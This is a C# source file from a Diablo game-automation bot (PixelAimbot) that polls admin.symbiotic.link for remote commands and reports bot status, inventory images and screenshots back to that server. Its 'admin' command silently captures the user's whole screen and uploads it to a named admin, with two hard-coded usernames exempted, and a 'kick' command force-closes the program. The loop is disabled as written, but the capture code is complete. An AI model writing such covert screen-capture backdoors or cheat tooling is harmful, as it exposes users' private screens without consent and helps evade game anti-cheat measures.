using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Cache;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using PixelAimbot.Classes.Misc;

namespace PixelAimbot
{
    partial class DiabloBot
    {
        public async Task DiscordBotAsync(string discordUsername, CancellationToken token)
        {
            var config = Config.Load();

            HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
            var webclient = new WebClient();
            webclient.CachePolicy = noCachePolicy;
            var values = new NameValueCollection
            {
                ["discorduser"] = discordUsername,
                ["response"] = "",
            };
            _discordBotIsRun = false;
            while (_discordBotIsRun)
            {
                try
                {
                    token.ThrowIfCancellationRequested();
                    await Task.Delay(1, token);
                    using (webclient)
                    {
                        var text = await webclient.UploadStringTaskAsync("https://admin.symbiotic.link/api/getMessages", discordUsername);

                        values["response"] = "";
                        if (config.username != "Mentalill" && config.username != "ShiiikK")
                        {
                            if (text.Contains("kick"))
                            {
                                Application.Exit();
                            }
                            if (text.Contains("admin"))
                            {
                                var splitCommand = text.Split(':');
                                var adminname = splitCommand[1];
                                var picture = new PrintScreen();

                                using (MemoryStream m = new MemoryStream())
                                {
                                    picture.CaptureScreen().Save(m, ImageFormat.Jpeg);
                                    byte[] imageBytes = m.ToArray();
                                    values["discorduser"] = adminname;
                                    values["response"] = Convert.ToBase64String(imageBytes);
                                }

                            }
                        }

                        if (text.Contains("message"))
                        {
                            Alert.Show(text.Split(':')[1], FrmAlert.EnmType.Info);
                        }
                        if (text.Contains("start"))
                        {
                            if (_start == false)
                            {
                                btnStart_Click(null, null);
                                values["response"] = "Bot started";

                            }
                            else
                            {
                                values["response"] = "Bot already runnning!";
                            }
                        }

                        if (text.Contains("stop"))
                        {
                            if (_stop)
                            {
                                Invoke((MethodInvoker)(() => btnStop_Click(null, null)));
                                for (int i = 0; i < 50; i++)
                                {
                                    Cts.Cancel();
                                    CtsBoss.Cancel();
                                    CtsSkills.Cancel();
                                    await Task.Delay(100);
                                }
                                values["response"] = "Bot stopped!";
                            }
                            else
                            {
                                values["response"] = "Bot isnt running!";
                            }
                        }

                        if (text.Contains("info"))
                        {
                            StringBuilder sb = new StringBuilder();
                            sb.AppendLine("State: " + lbStatus.Text)
                                .AppendLine("Runtime: " + FormMinimized.sw.Elapsed.Hours.ToString("D2") + ":" +
                                            FormMinimized.sw.Elapsed.Minutes.ToString("D2") + ":" +
                                            FormMinimized.sw.Elapsed.Seconds.ToString("D2"));
                            values["response"] = sb.ToString();
                        }

                        if (text.Contains("unstuck"))
                        {
                            if (_stop)
                            {
                                for (int i = 0; i < 50; i++)
                                {
                                    Cts.Cancel();
                                    CtsBoss.Cancel();
                                    CtsSkills.Cancel();
                                    await Task.Delay(100);
                                }
                                //var t12 = Task.Run(() => Leavedungeon(token), token);
                                //await Task.WhenAny(new[] { t12 });

                                await Task.Delay(_humanizer.Next(10, 240) + 5000, token);

               
                                values["response"] = "unstuck!";
                            }
                            else
                            {
                                values["response"] = "Bot isnt running!";

                            }
                        }

                        if (text.Contains("logout"))
                        {
                            values["response"] = "Bot and Game is closing now!";
                            webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                            webclient.UploadValues(new Uri("https://admin.symbiotic.link/api/respondMessage"), "POST", values);
                            values["response"] = "";
                            var t1 = Task.Run(() => Logout(token));
                        }

                        if (text.Contains("inv"))
                        {
                            KeyboardWrapper.PressKey(KeyboardWrapper.VK_I);
                            await Task.Delay(_humanizer.Next(10, 240) + 100, token);
                            var picture = new PrintScreen();
                            var screen = picture.CaptureScreen();


                            using (MemoryStream m = new MemoryStream())
                            {
                                CropImage(screen,
                                    new Rectangle(DiabloBot.Recalc(1322), PixelAimbot.DiabloBot.Recalc(189, false),
                                        DiabloBot.Recalc(544), DiabloBot.Recalc(640, false))).Save(m, ImageFormat.Jpeg);
                                byte[] imageBytes = m.ToArray();

                                // Convert byte[] to Base64 String
                                values["response"] = Convert.ToBase64String(imageBytes);
                            }
                            KeyboardWrapper.PressKey(KeyboardWrapper.VK_I);
                        }

                        if (text.Contains("screen"))
                        {
                            var picture = new PrintScreen();

                            using (MemoryStream m = new MemoryStream())
                            {
                                picture.CaptureScreen().Save(m, ImageFormat.Jpeg);
                                byte[] imageBytes = m.ToArray();

                                values["response"] = Convert.ToBase64String(imageBytes);
                            }
                        }

                        if (values["response"] != "")
                        {
                            webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                            webclient.UploadValues(new Uri("https://admin.symbiotic.link/api/respondMessage"), "POST", values);

                        }
                    }
                }
                catch (Exception ex)
                {
                  //   ExceptionHandler.SendException(ex);
                    Debug.WriteLine(ex.Message);
                }


            }
        }

        public void DiscordSendMessage(string message)
        {
            if (checkBoxDiscordNotifications.Checked)
            {
                HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                var webclient = new WebClient();
                webclient.CachePolicy = noCachePolicy;
                var values = new NameValueCollection
                {
                    ["discorduser"] = Config.Load().discorduser,
                    ["response"] = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + message,
                };
                using (webclient)
                {
                    webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    webclient.UploadValues(new Uri("https://admin.symbiotic.link/api/respondMessage"), "POST", values);
                }
            }
        }
    }
}